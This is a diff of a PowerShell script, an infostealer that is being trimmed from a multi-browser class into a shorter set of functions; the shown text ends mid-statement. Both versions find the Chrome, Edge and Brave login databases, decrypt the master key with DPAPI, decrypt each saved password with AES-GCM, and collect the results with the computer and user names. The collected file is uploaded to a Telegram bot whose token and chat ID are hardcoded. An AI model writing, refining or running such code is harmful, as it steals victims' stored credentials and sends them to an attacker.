@@ -1,662 +1,346 @@
-# Enhanced Multi-Browser Password Extractor with Python-like Decryption
-# Supports Chrome, Edge, Brave, Opera, and Firefox
+# Simple Browser Password Extractor
+# Supports Chrome, Edge, Brave
 
 param(
     [string]$TelegramBotToken = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w",
     [string]$TelegramChatID = "2146236602"
 )
 
-# Function to send message to Telegram
+# Send message to Telegram
 function Send-TelegramMessage {
-    param(
-        [string]$Message
-    )
+    param([string]$Message)
     
     try {
         $uri = "https://api.telegram.org/bot$TelegramBotToken/sendMessage"
-        $body = @{
-            chat_id = $TelegramChatID
-            text = $Message
-            parse_mode = "HTML"
-        }
-        
+        $body = @{chat_id = $TelegramChatID; text = $Message; parse_mode = "HTML"}
         $response = Invoke-RestMethod -Uri $uri -Method Post -Body $body -ContentType "application/json"
-        
-        if ($response.ok) {
-            Write-Host "✅ Message sent to Telegram" -ForegroundColor Green
-            return $true
-        } else {
-            Write-Host "❌ Telegram API error: $($response.description)" -ForegroundColor Red
-            return $false
-        }
-    } catch {
-        Write-Host "❌ Error sending message to Telegram: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
-    }
+        return $response.ok
+    } catch { return $false }
 }
 
-# Function to send files to Telegram
+# Send file to Telegram
 function Send-TelegramFile {
-    param(
-        [string]$FilePath,
-        [string]$Caption
-    )
+    param([string]$FilePath, [string]$Caption)
     
     try {
-        if (-not (Test-Path $FilePath)) {
-            Write-Host "File not found: $FilePath" -ForegroundColor Red
-            return $false
-        }
+        if (-not (Test-Path $FilePath)) { return $false }
         
-        # Wait for file to be fully written
-        $maxWaitTime = 30
-        $waitTime = 0
-        while ($waitTime -lt $maxWaitTime) {
-            try {
-                $file = Get-Item $FilePath
-                $fileSize = $file.Length
-                if ($fileSize -gt 0) {
-                    break
-                }
-            } catch {}
-            Start-Sleep -Seconds 1
-            $waitTime++
-        }
-        
-        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
-        $fileContent = [System.Text.Encoding]::UTF8.GetString($fileBytes)
-        $boundary = [System.Guid]::NewGuid().ToString()
+        $boundary = [Guid]::NewGuid().ToString()
         $LF = "`r`n"
+        $fileBytes = [IO.File]::ReadAllBytes($FilePath)
+        $fileContent = [Text.Encoding]::UTF8.GetString($fileBytes)
         
         $bodyLines = @(
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"chat_id`"",
-            "",
-            $TelegramChatID,
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"caption`"",
-            "",
-            $Caption,
-            "--$boundary",
-            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
-            "Content-Type: application/octet-stream",
-            "",
-            $fileContent,
-            "--$boundary--"
+            "--$boundary", "Content-Disposition: form-data; name=`"chat_id`"", "", $TelegramChatID,
+            "--$boundary", "Content-Disposition: form-data; name=`"caption`"", "", $Caption,
+            "--$boundary", "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
+            "Content-Type: application/octet-stream", "", $fileContent, "--$boundary--"
         ) -join $LF
 
         $uri = "https://api.telegram.org/bot$TelegramBotToken/sendDocument"
-        Write-Host "Sending file to Telegram: $(Split-Path $FilePath -Leaf)" -ForegroundColor Yellow
-        
         $response = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
+        return $response.ok
+    } catch { return $false }
+}
+
+# Get browser paths
+function Get-BrowserPaths {
+    $browsers = @{}
+    
+    # Chrome
+    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+    if (Test-Path $chromePath) { $browsers.Chrome = $chromePath }
+    
+    # Edge
+    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+    if (Test-Path $edgePath) { $browsers.Edge = $edgePath }
+    
+    # Brave
+    $bravePath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
+    if (Test-Path $bravePath) { $browsers.Brave = $bravePath }
+    
+    return $browsers
+}
+
+# Get encryption key from Local State
+function Get-EncryptionKey {
+    param([string]$BrowserPath)
+    
+    $localStatePath = "$BrowserPath\Local State"
+    if (-not (Test-Path $localStatePath)) { return $null }
+    
+    try {
+        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+        $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
         
-        if ($response.ok) {
-            Write-Host "✅ File sent to Telegram successfully: $(Split-Path $FilePath -Leaf)" -ForegroundColor Green
-            return $true
-        } else {
-            Write-Host "❌ Telegram API error: $($response.description)" -ForegroundColor Red
-            return $false
+        # Remove DPAPI prefix (first 5 bytes)
+        if ($encryptedKey.Length -gt 5) {
+            $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
         }
+        
+        # Use Windows DPAPI to decrypt
+        Add-Type -AssemblyName System.Security
+        $decryptedKey = [Security.Cryptography.ProtectedData]::Unprotect(
+            $encryptedKey,
+            $null,
+            [Security.Cryptography.DataProtectionScope]::CurrentUser
+        )
+        
+        return $decryptedKey
     } catch {
-        Write-Host "❌ Error sending to Telegram: $($_.Exception.Message)" -ForegroundColor Red
-        return $false
+        Write-Host "Error getting encryption key: $($_.Exception.Message)" -ForegroundColor Red
+        return $null
     }
 }
 
-# Browser Password Extractor Class
-class BrowserPasswordExtractor {
-    [hashtable]$browsers
+# Decrypt password
+function Decrypt-Password {
+    param([byte[]]$EncryptedData, [byte[]]$Key)
     
-    BrowserPasswordExtractor() {
-        $this.browsers = @{
-            "Chrome" = { $this.get_chrome_paths() }
-            "Edge" = { $this.get_edge_paths() }
-            "Brave" = { $this.get_brave_paths() }
-            "Opera" = { $this.get_opera_paths() }
-            "Firefox" = { $this.get_firefox_paths() }
-        }
-    }
+    if (-not $EncryptedData -or $EncryptedData.Length -eq 0) { return $null }
     
-    # Get Chrome profile paths
-    [array]get_chrome_paths() {
-        $base_path = Join-Path $env:USERPROFILE "AppData\Local\Google\Chrome\User Data"
-        return $this._get_chromium_profiles($base_path)
-    }
-    
-    # Get Microsoft Edge profile paths
-    [array]get_edge_paths() {
-        $base_path = Join-Path $env:USERPROFILE "AppData\Local\Microsoft\Edge\User Data"
-        return $this._get_chromium_profiles($base_path)
-    }
-    
-    # Get Brave browser profile paths
-    [array]get_brave_paths() {
-        $base_path = Join-Path $env:USERPROFILE "AppData\Local\BraveSoftware\Brave-Browser\User Data"
-        return $this._get_chromium_profiles($base_path)
-    }
-    
-    # Get Opera profile paths
-    [array]get_opera_paths() {
-        $base_path = Join-Path $env:USERPROFILE "AppData\Roaming\Opera Software\Opera Stable"
-        $profiles = @()
-        
-        if (Test-Path $base_path) {
-            $login_data = Join-Path $base_path "Login Data"
-            if (Test-Path $login_data) {
-                $profiles += @("Default", $base_path)
-            }
-        }
-        return $profiles
-    }
-    
-    # Get Firefox profile paths
-    [array]get_firefox_paths() {
-        $firefox_path = Join-Path $env:USERPROFILE "AppData\Roaming\Mozilla\Firefox\Profiles"
-        $profiles = @()
-        
-        if (Test-Path $firefox_path) {
-            $profile_dirs = Get-ChildItem -Path $firefox_path -Directory -Filter "*.default*"
-            foreach ($profile_dir in $profile_dirs) {
-                $profile_name = $profile_dir.Name
-                $profiles += @($profile_name, $profile_dir.FullName)
-            }
-        }
-        return $profiles
-    }
-    
-    # Get profiles for Chromium-based browsers
-    [array]_get_chromium_profiles([string]$base_path) {
-        $profiles = @()
-        
-        if (Test-Path $base_path) {
-            # Default profile
-            $default_profile = Join-Path $base_path "Default"
-            $default_login_data = Join-Path $default_profile "Login Data"
-            if (Test-Path $default_login_data) {
-                $profiles += @("Default", $default_profile)
-            }
+    try {
+        # Check for AES-GCM encryption (v10 or v20)
+        if ($EncryptedData.Length -ge 3) {
+            $prefix = [Text.Encoding]::ASCII.GetString($EncryptedData[0..2])
             
-            # Other profiles
-            $profile_dirs = Get-ChildItem -Path $base_path -Directory -Filter "Profile *"
-            foreach ($profile_dir in $profile_dirs) {
-                $login_data = Join-Path $profile_dir.FullName "Login Data"
-                if (Test-Path $login_data) {
-                    $profile_name = $profile_dir.Name
-                    $profiles += @($profile_name, $profile_dir.FullName)
-                }
-            }
-        }
-        return $profiles
-    }
-    
-    # Get encryption key for Chromium-based browsers
-    [byte[]]get_encryption_key([string]$browser_path) {
-        $local_state_path = Join-Path $browser_path "Local State"
-        
-        try {
-            if (-not (Test-Path $local_state_path)) {
-                Write-Host "    ❌ Local State file not found: $local_state_path" -ForegroundColor Red
-                return $null
-            }
-            
-            $local_state_content = Get-Content $local_state_path -Raw | ConvertFrom-Json
-            $encrypted_key_base64 = $local_state_content.os_crypt.encrypted_key
-            
-            if (-not $encrypted_key_base64) {
-                Write-Host "    ❌ No encrypted key found in Local State" -ForegroundColor Red
-                return $null
-            }
-            
-            # Decode base64
-            $encrypted_key = [System.Convert]::FromBase64String($encrypted_key_base64)
-            
-            # Remove DPAPI prefix (first 5 bytes)
-            if ($encrypted_key.Length -gt 5) {
-                $encrypted_key = $encrypted_key[5..($encrypted_key.Length - 1)]
-            }
-            
-            # Decrypt using DPAPI (Windows Data Protection API)
-            # Note: In PowerShell, we use the Windows DPAPI through .NET
-            Add-Type -AssemblyName System.Security
-            
-            try {
-                $decrypted_key = [System.Security.Cryptography.ProtectedData]::Unprotect(
-                    $encrypted_key,
-                    $null,
-                    [System.Security.Cryptography.DataProtectionScope]::CurrentUser
-                )
+            if ($prefix -eq "v10" -or $prefix -eq "v20") {
+                if ($EncryptedData.Length -lt 15) { return $null }
                 
-                Write-Host "    ✓ Encryption key obtained successfully" -ForegroundColor Green
-                return $decrypted_key
-            } catch {
-                Write-Host "    ❌ Error decrypting master key: $($_.Exception.Message)" -ForegroundColor Red
-                return $null
-            }
-            
-        } catch {
-            Write-Host "    ❌ Error getting encryption key: $($_.Exception.Message)" -ForegroundColor Red
-            return $null
-        }
-    }
-    
-    # Decrypt Chromium-based browser passwords
-    [string]decrypt_chromium_password([byte[]]$encrypted_password, [byte[]]$key) {
-        try {
-            if (-not $encrypted_password -or $encrypted_password.Length -eq 0) {
-                return $null
-            }
-            
-            # Check if it's AES-GCM encrypted (starts with v10 or v20)
-            if ($encrypted_password.Length -ge 3) {
-                $prefix = [System.Text.Encoding]::ASCII.GetString($encrypted_password[0..2])
+                # AES-GCM decryption
+                $iv = $EncryptedData[3..14]
+                $ciphertext = $EncryptedData[15..($EncryptedData.Length - 17)]
+                $tag = $EncryptedData[($EncryptedData.Length - 16)..($EncryptedData.Length - 1)]
                 
-                if ($prefix -eq "v10" -or $prefix -eq "v20") {
-                    # AES-GCM encryption
-                    if ($encrypted_password.Length -lt 15) {
-                        return $null
-                    }
-                    
-                    # Extract IV (12 bytes after version prefix)
-                    $iv = $encrypted_password[3..14]
-                    
-                    # Extract ciphertext (everything after IV and before tag)
-                    $ciphertext_length = $encrypted_password.Length - 16 - 15
-                    if ($ciphertext_length -le 0) {
-                        return $null
-                    }
-                    
-                    $ciphertext = $encrypted_password[15..($ciphertext_length + 14)]
-                    
-                    # Extract tag (last 16 bytes)
-                    $tag = $encrypted_password[($encrypted_password.Length - 16)..($encrypted_password.Length - 1)]
-                    
-                    # Try to decrypt using AES-GCM
-                    # Note: .NET Core 3.0+ or .NET 5.0+ required for AesGcm
-                    try {
-                        Add-Type -AssemblyName System.Security
-                        
-                        # Check if AesGcm is available
-                        $aesGcmType = [System.Security.Cryptography.AesGcm]
-                        if ($aesGcmType) {
-                            $aes = New-Object System.Security.Cryptography.AesGcm($key)
-                            $plaintext = New-Object byte[] $ciphertext.Length
-                            $aes.Decrypt($iv, $ciphertext, $tag, $plaintext)
-                            return [System.Text.Encoding]::UTF8.GetString($plaintext)
-                        } else {
-                            Write-Host "    ⚠️ AES-GCM requires .NET Core 3.0+ or .NET 5.0+" -ForegroundColor Yellow
-                            # Fallback to DPAPI for older encryption
-                            return $this._decrypt_with_dpapi($encrypted_password)
-                        }
-                    } catch {
-                        Write-Host "    ⚠️ AES-GCM decryption failed: $($_.Exception.Message)" -ForegroundColor Yellow
-                        # Fallback to DPAPI
-                        return $this._decrypt_with_dpapi($encrypted_password)
-                    }
-                }
-            }
-            
-            # Try DPAPI encryption for older versions
-            return $this._decrypt_with_dpapi($encrypted_password)
-            
-        } catch {
-            Write-Host "    ⚠️ Password decryption error: $($_.Exception.Message)" -ForegroundColor Yellow
-            return $null
-        }
-    }
-    
-    # Helper method to decrypt using DPAPI
-    [string]_decrypt_with_dpapi([byte[]]$encrypted_data) {
-        try {
-            Add-Type -AssemblyName System.Security
-            
-            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
-                $encrypted_data,
-                $null,
-                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
-            )
-            
-            return [System.Text.Encoding]::UTF8.GetString($decrypted)
-        } catch {
-            return $null
-        }
-    }
-    
-    # Extract Firefox passwords (simplified)
-    [array]decrypt_firefox_password([string]$profile_path) {
-        try {
-            $signons_path = Join-Path $profile_path "signons.sqlite"
-            $logins_path = Join-Path $profile_path "logins.json"
-            
-            $passwords = @()
-            
-            # Try old format (signons.sqlite)
-            if (Test-Path $signons_path) {
-                $temp_db = "temp_firefox.db"
-                Copy-Item $signons_path $temp_db -Force
-                
+                # Use .NET's AesGcm if available
                 try {
-                    # Using SQLite in PowerShell (requires sqlite3.exe or System.Data.SQLite)
-                    $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection
-                    $conn.ConnectionString = "Data Source=$temp_db"
-                    $conn.Open()
-                    
-                    $cmd = $conn.CreateCommand()
-                    $cmd.CommandText = "SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins"
-                    
-                    $reader = $cmd.ExecuteReader()
-                    
-                    while ($reader.Read()) {
-                        $host = $reader.GetString(0)
-                        
-                        $passwords += @{
-                            url = $host
-                            username = "[Firefox - Requires Master Password]"
-                            password = "[Firefox - Requires Master Password]"
-                        }
-                    }
-                    
-                    $reader.Close()
-                    $cmd.Dispose()
-                    $conn.Close()
-                    $conn.Dispose()
-                    
+                    $aes = New-Object Security.Cryptography.AesGcm($Key)
+                    $plaintext = New-Object byte[] $ciphertext.Length
+                    $aes.Decrypt($iv, $ciphertext, $tag, $plaintext)
+                    return [Text.Encoding]::UTF8.GetString($plaintext)
                 } catch {
-                    Write-Host "    ❌ Error reading Firefox database: $($_.Exception.Message)" -ForegroundColor Red
-                } finally {
-                    if (Test-Path $temp_db) {
-                        Remove-Item $temp_db -Force
-                    }
+                    # Fallback to DPAPI for older encryption
+                    return Decrypt-WithDPAPI $EncryptedData
                 }
             }
-            # Try new format (logins.json)
-            elseif (Test-Path $logins_path) {
-                try {
-                    $logins_data = Get-Content $logins_path -Raw | ConvertFrom-Json
+        }
+        
+        # DPAPI decryption for older versions
+        return Decrypt-WithDPAPI $EncryptedData
+        
+    } catch {
+        return $null
+    }
+}
+
+# DPAPI decryption
+function Decrypt-WithDPAPI {
+    param([byte[]]$EncryptedData)
+    
+    try {
+        Add-Type -AssemblyName System.Security
+        $decrypted = [Security.Cryptography.ProtectedData]::Unprotect(
+            $EncryptedData,
+            $null,
+            [Security.Cryptography.DataProtectionScope]::CurrentUser
+        )
+        return [Text.Encoding]::UTF8.GetString($decrypted)
+    } catch {
+        return $null
+    }
+}
+
+# Extract passwords from browser
+function Extract-BrowserPasswords {
+    param([string]$BrowserName, [string]$BrowserPath, [byte[]]$Key)
+    
+    $results = @()
+    
+    # Check default profile
+    $defaultProfile = "$BrowserPath\Default"
+    if (Test-Path "$defaultProfile\Login Data") {
+        $results += Extract-FromProfile $BrowserName "Default" $defaultProfile $Key
+    }
+    
+    # Check other profiles
+    $profiles = Get-ChildItem -Path $BrowserPath -Directory -Filter "Profile *"
+    foreach ($profile in $profiles) {
+        if (Test-Path "$($profile.FullName)\Login Data") {
+            $results += Extract-FromProfile $BrowserName $profile.Name $profile.FullName $Key
+        }
+    }
+    
+    return $results
+}
+
+# Extract from specific profile
+function Extract-FromProfile {
+    param([string]$BrowserName, [string]$ProfileName, [string]$ProfilePath, [byte[]]$Key)
+    
+    $dbPath = "$ProfilePath\Login Data"
+    if (-not (Test-Path $dbPath)) { return @() }
+    
+    $tempDb = "temp_$($BrowserName)_$($ProfileName -replace '[^a-zA-Z0-9]', '_').db"
+    $passwords = @()
+    
+    try {
+        Copy-Item $dbPath $tempDb -Force
+        
+        # Download sqlite3 if not present
+        if (-not (Test-Path "sqlite3.exe")) {
+            $sqliteUrl = "https://www.sqlite.org/2023/sqlite-tools-win32-x86-3430200.zip"
+            $tempZip = "sqlite-temp.zip"
+            Invoke-WebRequest -Uri $sqliteUrl -OutFile $tempZip -UseBasicParsing
+            Expand-Archive -Path $tempZip -DestinationPath ".\sqlite-temp" -Force
+            Copy-Item ".\sqlite-temp\sqlite-tools-win32-x86-3430200\sqlite3.exe" ".\sqlite3.exe" -Force
+            Remove-Item $tempZip, ".\sqlite-temp" -Recurse -Force
+        }
+        
+        # Export data using sqlite3
+        $tempCsv = "temp_data.csv"
+        $query = "SELECT origin_url, username_value, password_value FROM logins;"
+        & .\sqlite3.exe -csv -header $tempDb $query > $tempCsv
+        
+        if (Test-Path $tempCsv) {
+            $data = Import-Csv $tempCsv
+            Write-Host "  Found $($data.Count) logins in $BrowserName ($ProfileName)" -ForegroundColor Green
+            
+            foreach ($row in $data) {
+                if ($row.password_value -and $row.username_value) {
+                    $encryptedBytes = [Text.Encoding]::Default.GetBytes($row.password_value)
+                    $password = Decrypt-Password -EncryptedData $encryptedBytes -Key $Key
                     
-                    foreach ($login in $logins_data.logins) {
-                        $passwords += @{
-                            url = $login.hostname
-                            username = "[Firefox - Encrypted]"
-                            password = "[Firefox - Encrypted]"
+                    if ($password) {
+                        $passwords += [PSCustomObject]@{
+                            Browser = $BrowserName
+                            Profile = $ProfileName
+                            URL = $row.origin_url
+                            Username = $row.username_value
+                            Password = $password
                         }
                     }
-                } catch {
-                    Write-Host "    ❌ Error reading Firefox logins.json: $($_.Exception.Message)" -ForegroundColor Red
                 }
             }
             
-            return $passwords
-            
-        } catch {
-            Write-Host "    ❌ Firefox decryption error: $($_.Exception.Message)" -ForegroundColor Red
-            return @()
+            Remove-Item $tempCsv -Force
         }
+        
+        Remove-Item $tempDb -Force
+        
+    } catch {
+        Write-Host "  Error extracting from $BrowserName ($ProfileName): $($_.Exception.Message)" -ForegroundColor Red
     }
     
-    # Extract passwords from Chromium-based browsers
-    [array]extract_chromium_passwords([string]$browser_name, [string]$profile_name, [string]$profile_path, [byte[]]$key) {
-        $db_path = Join-Path $profile_path "Login Data"
-        
-        if (-not (Test-Path $db_path)) {
-            return @()
-        }
-        
-        try {
-            $temp_db = "temp_$($browser_name)_$($profile_name -replace '[^a-zA-Z0-9]', '_').db"
-            Copy-Item $db_path $temp_db -Force
-            
-            $passwords = @()
-            
-            try {
-                # Using SQLite in PowerShell
-                $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection
-                $conn.ConnectionString = "Data Source=$temp_db"
-                $conn.Open()
-                
-                $cmd = $conn.CreateCommand()
-                $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
-                
-                $reader = $cmd.ExecuteReader()
-                
-                $counter = 0
-                while ($reader.Read()) {
-                    $url = $reader.GetString(0)
-                    $username = $reader.GetString(1)
-                    
-                    # Get password as bytes
-                    $password_value = $null
-                    try {
-                        # Try to get as byte array
-                        $password_value = $reader.GetValue(2)
-                        if ($password_value -is [byte[]]) {
-                            $encrypted_password = $password_value
-                        } elseif ($password_value -is [System.DBNull]) {
-                            $encrypted_password = $null
-                        } else {
-                            # Try to convert to byte array
-                            $encrypted_password = [System.Text.Encoding]::UTF8.GetBytes($password_value.ToString())
-                        }
-                    } catch {
-                        $encrypted_password = $null
-                    }
-                    
-                    if ($encrypted_password) {
-                        $password = $this.decrypt_chromium_password($encrypted_password, $key)
-                        if ($password -and $username) {
-                            $passwords += @{
-                                url = $url
-                                username = $username
-                                password = $password
-                            }
-                            $counter++
-                        }
-                    }
-                }
-                
-                Write-Host "      📁 $profile_name: $counter passwords" -ForegroundColor Green
-                
-                $reader.Close()
-                $cmd.Dispose()
-                $conn.Close()
-                $conn.Dispose()
-                
-            } catch {
-                Write-Host "    ❌ Error reading database: $($_.Exception.Message)" -ForegroundColor Red
-            } finally {
-                if (Test-Path $temp_db) {
-                    Remove-Item $temp_db -Force
-                }
-            }
-            
-            return $passwords
-            
-        } catch {
-            Write-Host "    ❌ Error extracting from $browser_name: $($_.Exception.Message)" -ForegroundColor Red
-            return @()
-        }
-    }
-    
-    # Scan all browsers for passwords
-    [hashtable]scan_all_browsers() {
-        Write-Host "🌐 Multi-Browser Password Extractor" -ForegroundColor Cyan
-        Write-Host "=" * 60 -ForegroundColor Cyan
-        Write-Host "Scanning all major browsers..." -ForegroundColor Yellow
-        Write-Host ""
-        
-        $all_results = @{}
-        
-        foreach ($browser_name in $this.browsers.Keys) {
-            Write-Host "🔍 Scanning $browser_name..." -ForegroundColor Yellow
-            
-            try {
-                $profile_func = $this.browsers[$browser_name]
-                $profiles = & $profile_func
-                
-                if (-not $profiles -or $profiles.Count -eq 0) {
-                    Write-Host "   ❌ $browser_name not found or no profiles" -ForegroundColor Red
-                    continue
-                }
-                
-                Write-Host "   ✓ Found $($profiles.Count / 2) profile(s)" -ForegroundColor Green
-                
-                $browser_passwords = @()
-                
-                # Process each profile (pairs of name and path)
-                for ($i = 0; $i -lt $profiles.Count; $i += 2) {
-                    $profile_name = $profiles[$i]
-                    $profile_path = $profiles[$i + 1]
-                    
-                    if ($browser_name -eq "Firefox") {
-                        # Firefox uses different encryption
-                        $passwords = $this.decrypt_firefox_password($profile_path)
-                    } else {
-                        # Chromium-based browsers
-                        $browser_data_path = Split-Path $profile_path -Parent
-                        $key = $this.get_encryption_key($browser_data_path)
-                        if (-not $key) {
-                            continue
-                        }
-                        $passwords = $this.extract_chromium_passwords($browser_name, $profile_name, $profile_path, $key)
-                    }
-                    
-                    $browser_passwords += $passwords
-                }
-                
-                $all_results[$browser_name] = $browser_passwords
-                Write-Host "   ✅ $browser_name: $($browser_passwords.Count) total passwords" -ForegroundColor Green
-                
-            } catch {
-                Write-Host "   ❌ Error scanning $browser_name`: $($_.Exception.Message)" -ForegroundColor Red
-            }
-            
-            Write-Host ""
-        }
-        
-        return $all_results
-    }
-    
-    # Display extracted passwords
-    [void]display_results([hashtable]$results) {
-        Write-Host "📋 EXTRACTION RESULTS" -ForegroundColor Cyan
-        Write-Host "=" * 80 -ForegroundColor Cyan
-        
-        $total_passwords = 0
-        foreach ($browser_name in $results.Keys) {
-            $passwords = $results[$browser_name]
-            
-            if ($passwords -and $passwords.Count -gt 0) {
-                Write-Host "`n🖥️  $($browser_name.ToUpper()) ($($passwords.Count) passwords):" -ForegroundColor Yellow
-                Write-Host "-" * 60 -ForegroundColor Gray
-                
-                # Show first 10 entries
-                $max_to_show = [Math]::Min(10, $passwords.Count)
-                for ($i = 0; $i -lt $max_to_show; $i++) {
-                    $entry = $passwords[$i]
-                    Write-Host "  $($i+1):2. 🌐 $($entry.url)" -ForegroundColor White
-                    Write-Host "      👤 $($entry.username)" -ForegroundColor Gray
-                    Write-Host "      🔑 $($entry.password)" -ForegroundColor Green
-                }
-                
-                if ($passwords.Count -gt 10) {
-                    Write-Host "  ... and $($passwords.Count - 10) more passwords" -ForegroundColor Gray
-                }
-                
-                $total_passwords += $passwords.Count
-            }
-        }
-        
-        $browsers_with_passwords = ($results.Keys | Where-Object { $results[$_].Count -gt 0 }).Count
-        Write-Host "`n📊 SUMMARY: Found $total_passwords total passwords across $browsers_with_passwords browsers" -ForegroundColor Cyan
-        
-        # Save to file
-        $this.save_to_file($results)
-    }
-    
-    # Save results to JSON file
-    [void]save_to_file([hashtable]$results) {
-        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
-        $filename = "browser_passwords_${timestamp}.json"
-        
-        # Convert to serializable format
-        $serializable_results = @{}
-        foreach ($browser in $results.Keys) {
-            $serializable_results[$browser] = $results[$browser]
-        }
-        
-        try {
-            $serializable_results | ConvertTo-Json -Depth 10 | Out-File -FilePath $filename -Encoding UTF8
-            Write-Host "💾 Results saved to: $filename" -ForegroundColor Green
-            
-            # Send to Telegram if configured
-            if ($TelegramBotToken -and $TelegramChatID) {
-                $caption = "Browser Passwords Extracted`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`nTotal: $total_passwords passwords"
-                Send-TelegramFile -FilePath $filename -Caption $caption | Out-Null
-                
-                # Clean up file after sending
-                Start-Sleep -Seconds 2
-                if (Test-Path $filename) {
-                    Remove-Item $filename -Force
-                }
-            }
-            
-        } catch {
-            Write-Host "❌ Error saving to file: $($_.Exception.Message)" -ForegroundColor Red
-        }
-    }
-    
-    # Main method
-    [void]main() {
-        Write-Host "🚀 Starting Multi-Browser Password Extraction..." -ForegroundColor Green
-        Write-Host "⚠️  Make sure all browsers are closed before running!" -ForegroundColor Yellow
-        Write-Host ""
-        
-        # Check if System.Data.SQLite assembly is available for database operations
-        try {
-            Add-Type -Path "System.Data.SQLite.dll" -ErrorAction Stop
-        } catch {
-            Write-Host "⚠️  System.Data.SQLite not found. Attempting to download..." -ForegroundColor Yellow
-            
-            try {
-                # Download SQLite interop DLL
-                $sqliteUrl = "https://www.sqlite.org/2023/sqlite-dll-win32-x86-3440200.zip"
-                $tempZip = "sqlite-dll.zip"
-                
-                Invoke-WebRequest -Uri $sqliteUrl -OutFile $tempZip -UseBasicParsing
-                Expand-Archive -Path $tempZip -DestinationPath "." -Force
-                
-                # Also try to load System.Data.SQLite from NuGet or local
-                Write-Host "✓ SQLite DLL downloaded. Manual assembly load may be required." -ForegroundColor Green
-            } catch {
-                Write-Host "❌ Failed to download SQLite. Some features may not work." -ForegroundColor Red
-            }
-        }
-        
-        $results = $this.scan_all_browsers()
-        $this.display_results($results)
-    }
+    return $passwords
 }
 
 # Main execution
-function Main {
-    # Send start message to Telegram
-    $startMessage = @"
-🚀 Starting Browser Password Extraction
+Write-Host "🌐 Browser Password Extractor" -ForegroundColor Cyan
+Write-Host "=" * 50 -ForegroundColor Cyan
+Write-Host "Scanning browsers..." -ForegroundColor Yellow
+Write-Host ""
+
+# Send start message
+$startMsg = @"
+🚀 Starting Password Extraction
 • Computer: $env:COMPUTERNAME
 • User: $env:USERNAME
 • Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
-• OS: $((Get-WmiObject -Class Win32_OperatingSystem).Caption)
 "@
-    
-    Send-TelegramMessage -Message $startMessage | Out-Null
-    
-    # Create extractor and run
-    $extractor = [BrowserPasswordExtractor]::new()
-    $extractor.main()
-    
-    # Send completion message
-    $completionMessage = "✅ Browser password extraction completed at $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
-    Send-TelegramMessage -Message $completionMessage | Out-Null
+Send-TelegramMessage -Message $startMsg | Out-Null
+
+# Get system info
+$systemInfo = @{
+    Computer = $env:COMPUTERNAME
+    User = $env:USERNAME
+    OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
+    Time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
 }
 
-# Execute main function
-Main
+# Get all passwords
+$allPasswords = @()
+$browsers = Get-BrowserPaths
+
+foreach ($browserName in $browsers.Keys) {
+    Write-Host "🔍 Scanning $browserName..." -ForegroundColor Yellow
+    
+    $browserPath = $browsers[$browserName]
+    $key = Get-EncryptionKey -BrowserPath $browserPath
+    
+    if ($key) {
+        $passwords = Extract-BrowserPasswords -BrowserName $browserName -BrowserPath $browserPath -Key $key
+        $allPasswords += $passwords
+        Write-Host "  ✓ Found $($passwords.Count) passwords" -ForegroundColor Green
+    } else {
+        Write-Host "  ✗ No encryption key found" -ForegroundColor Red
+    }
+    
+    Write-Host ""
+}
+
+# Display results
+if ($allPasswords.Count -gt 0) {
+    Write-Host "📋 EXTRACTION RESULTS" -ForegroundColor Cyan
+    Write-Host "=" * 50 -ForegroundColor Cyan
+    Write-Host "Total passwords found: $($allPasswords.Count)" -ForegroundColor Green
+    
+    # Group by browser
+    $grouped = $allPasswords | Group-Object Browser
+    
+    foreach ($group in $grouped) {
+        Write-Host "`n$($group.Name): $($group.Count) passwords" -ForegroundColor Yellow
+        Write-Host "-" * 40
+        
+        # Show first 5 entries
+        $toShow = $group.Group | Select-Object -First 5
+        foreach ($entry in $toShow) {
+            Write-Host "  URL: $($entry.URL)" -ForegroundColor White
+            Write-Host "  User: $($entry.Username)" -ForegroundColor Gray
+            Write-Host "  Pass: $($entry.Password)" -ForegroundColor Green
+            Write-Host ""
+        }
+        
+        if ($group.Count -gt 5) {
+            Write-Host "  ... and $($group.Count - 5) more" -ForegroundColor Gray
+        }
+    }
+    
+    # Save to JSON
+    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
+    $filename = "passwords_$timestamp.json"
+    
+    $exportData = @{
+        Metadata = $systemInfo
+        Passwords = $allPasswords
+    }
+    
+    $exportData | ConvertTo-Json -Depth 5 | Out-File $filename -Encoding UTF8
+    Write-Host "`n💾 Results saved to: $filename" -ForegroundColor Green
+    
+    # Send to Telegram
+    if ($TelegramBotToken -and $TelegramChatID) {
+        $caption = @"
+Passwords Extracted
+• Computer: $($systemInfo.Computer)
+• User: $($systemInfo.User)
+• Total: $($allPasswords.Count) passwords
+• Time: $($systemInfo.Time)
+"@
+        
+        if (Send-TelegramFile -FilePath $filename -Caption $caption) {
+            Write-Host "📤 Sent to Telegram" -ForegroundColor Green
+            Remove-Item $filename -Force
+        }
+    }
+    
+} else {
+    Write-Host "❌ No passwords found" -ForegroundColor Red
+    $emptyMsg = "No passwords found on $($systemInfo.Computer) at $($systemInfo.Time)"
